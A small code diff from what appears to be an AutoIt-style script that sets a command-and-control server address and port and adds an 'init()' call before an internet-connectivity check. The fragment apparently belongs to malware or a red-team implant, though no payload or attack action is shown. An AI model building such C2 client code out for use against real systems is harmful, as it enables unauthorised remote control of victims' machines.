@@ -7,6 +7,8 @@ $c2server = "192.168.231.106"
 $c2port = "432"
 $Nlogon = 2
 
+init()
+
 if InternetCheck()	Then
 
    MessageBox("Debug","Internet is up!")
